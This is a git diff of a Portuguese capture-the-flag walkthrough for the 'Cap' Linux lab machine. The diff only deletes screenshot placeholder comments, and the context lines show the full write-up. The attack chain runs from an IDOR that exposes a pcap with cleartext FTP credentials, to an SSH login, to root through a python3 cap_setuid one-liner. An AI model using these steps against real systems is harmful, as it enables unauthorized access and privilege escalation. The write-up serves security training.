@@ -21,7 +21,6 @@ Cap é uma máquina Linux de dificuldade fácil que explora uma vulnerabilidade 
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-<!-- [PRINT: resultado do nmap] -->
 
 Portas abertas encontradas:
 
@@ -41,7 +40,6 @@ Ao acessar `http://<IP>`, encontramos uma dashboard de segurança de rede com fu
 
 A funcionalidade **Security Snapshot** gera uma captura de pacotes e redireciona para `/data/<id>`, onde `<id>` é um número inteiro sequencial.
 
-<!-- [PRINT: página /data/1 com o PCAP gerado] -->
 
 ---
 
@@ -53,7 +51,6 @@ A aplicação não valida se o PCAP solicitado pertence ao usuário autenticado.
 http://<IP>/data/0
 ```
 
-<!-- [PRINT: página /data/0] -->
 
 Download do arquivo `0.pcap`.
 
@@ -67,7 +64,6 @@ Abrindo o arquivo no Wireshark e filtrando por protocolo FTP:
 ftp
 ```
 
-<!-- [PRINT: Wireshark com credenciais FTP visíveis] -->
 
 Encontramos uma sessão FTP com credenciais em texto claro:
 
@@ -84,13 +80,11 @@ Com as credenciais encontradas, acessamos via SSH:
 ssh nathan@<IP>
 ```
 
-<!-- [PRINT: shell após login SSH] -->
 
 ```bash
 cat user.txt
 ```
 
-<!-- [PRINT: user flag] -->
 
 ---
 
@@ -102,7 +96,6 @@ cat user.txt
 getcap -r / 2>/dev/null
 ```
 
-<!-- [PRINT: saída do getcap] -->
 
 Resultado relevante:
 
@@ -118,14 +111,12 @@ O binário do Python3 possui `cap_setuid`, que permite ao processo alterar seu U
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-<!-- [PRINT: shell root] -->
 
 ```bash
 whoami
 cat /root/root.txt
 ```
 
-<!-- [PRINT: root flag] -->
 
 ---
 
